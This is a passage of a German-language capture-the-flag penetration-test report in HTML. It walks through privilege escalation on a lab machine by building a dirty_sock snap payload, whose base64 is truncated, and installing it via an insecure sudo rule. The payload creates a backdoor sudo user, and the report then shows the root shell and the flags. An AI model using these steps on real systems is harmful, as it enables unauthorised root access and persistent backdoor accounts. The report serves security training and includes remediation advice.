+                     <div class="prompt">admin@quandary:/tmp$ <span class="command">python3 -c 'print("aHNxcwcAAAAQ[...viel Base64...]CAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0AAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "")' | base64 -d > payload.snap</span></div>
+                     <!-- Erstellung des bösartigen Snap-Pakets -->
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Ein langer Python-Einzeiler wird ausgeführt. Er gibt einen sehr langen Base64-String aus, fügt eine große Menge 'A'-Zeichen hinzu (Padding oder Teil des Exploits?) und leitet das Ergebnis durch `base64 -d`, um die Binärdaten zu dekodieren. Diese Binärdaten werden in die Datei `/tmp/payload.snap` geschrieben. Der Base64-String selbst enthält wahrscheinlich die Struktur und den Payload des bösartigen Snap-Pakets. Der Payload (im Hex-Teil des Base64-Strings kodiert) scheint Befehle wie `useradd dirty_sock ...`, `usermod -aG sudo dirty_sock` und `echo "dirty_sock ALL=(ALL:ALL) ALL" >> /etc/sudoers` zu enthalten, um einen neuen Sudo-Benutzer `dirty_sock` mit dem Passwort `dirty_sock` (aus dem Hash `$6$...`) zu erstellen.
+             </p>
+              <p class="evaluation">
+                 **Bewertung:** Hier wird das bösartige Snap-Paket direkt auf der Zielmaschine erstellt. Der Payload ist darauf ausgelegt, einen neuen Benutzer (`dirty_sock`) mit vollen `sudo`-Rechten anzulegen.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">admin@quandary:/tmp$ <span class="command">sudo snap install /tmp/payload.snap --dangerous --devmode</span></div>
+                     <pre>
+<span class="password">dirty-sock 0.1 installed</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der `admin`-Benutzer nutzt seine `sudo`-Berechtigung, um das gerade erstellte Snap-Paket zu installieren.
+                *   `sudo snap install /tmp/payload.snap`: Führt die Installation als `root` aus.
+                *   `--dangerous`: Erforderlich, um ein nicht signiertes oder lokal erstelltes Snap zu installieren.
+                *   `--devmode`: Installiert das Snap ohne die üblichen Sicherheitsbeschränkungen (Confinement), was dem Snap vollen Systemzugriff gibt und die Ausführung des eingebetteten Payloads (Benutzererstellung) ermöglicht.
+                Die Erfolgsmeldung `dirty-sock 0.1 installed` bestätigt, dass das Paket installiert und der Payload ausgeführt wurde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Snap-Exploit war erfolgreich. Der Benutzer `dirty_sock` mit `sudo`-Rechten sollte nun existieren.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">admin@quandary:/tmp$ <span class="command">su dirty_sock</span></div>
+                     <pre>
+Password: <span class="password">dirty_sock</span> <span class="comment"># Passwort eingegeben</span>
+                     </pre>
+                     <div class="prompt">bash-5.0$ <span class="command">id</span></div>
+                     <pre>
+<span class="command">uid=1002(dirty_sock) gid=1002(dirty_sock) groups=1002(dirty_sock),27(sudo)</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester wechselt mit `su` zum neu erstellten Benutzer `dirty_sock` und gibt das im Snap-Payload definierte Passwort (`dirty_sock`) ein. Der `id`-Befehl bestätigt, dass der Benutzer `dirty_sock` ist und zur `sudo`-Gruppe (GID 27) gehört.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Wechsel zum privilegierten Benutzer war erfolgreich.
+            </p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.0$ <span class="command">sudo bash</span></div>
+                      <pre>
+[sudo] password for dirty_sock: <span class="password">dirty_sock</span> <span class="comment"># Passwort eingegeben</span>
+<span class="prompt">root@quandary:/tmp#</span>
+                      </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Als `dirty_sock` wird `sudo bash` ausgeführt. Nach Eingabe des Passworts (`dirty_sock`) erhält der Pentester eine Shell als `root`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Fantastisch! Privilege Escalation zu `root` erfolgreich abgeschlossen durch Ausnutzung der unsicheren `sudo`-Regel für `snap install`.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@quandary:/tmp# <span class="command">cd</span></div>
+                     <div class="prompt">root@quandary:~# <span class="command">cat root.txt</span></div>
+                      <pre>
+<span class="password">3b6c2400f61971aca564a57dc35335bd</span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `root` wird ins Home-Verzeichnis gewechselt und die `root.txt`-Datei gelesen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Root-Flag wurde erfolgreich erlangt. Das Ziel ist erreicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Root-Flag dokumentieren. Bereinigung durchführen (erstellten Benutzer `dirty_sock` entfernen, installiertes Snap entfernen, falls möglich).<br>
+                **Empfehlung (Admin):** Die unsichere `sudo`-Regel für `snap install` entfernen. Das System auf durch den Exploit verursachte Änderungen überprüfen (neuer Benutzer, sudoers-Eintrag). Alle kompromittierten Passwörter ändern. Splunk- und DirectAdmin-Instanzen absichern. SSH-Schlüssel austauschen.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/admin/user.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">491af4faeac2a53adf47f2642ab7a769</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Standard-Pfad für root -->
+                     <div class="flag-value"><span class="password">3b6c2400f61971aca564a57dc35335bd</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Logs extrahiert -->
+        <p>Berichtsdatum: 12. April 2023</p>
+    </footer>
+</body>
+</html>
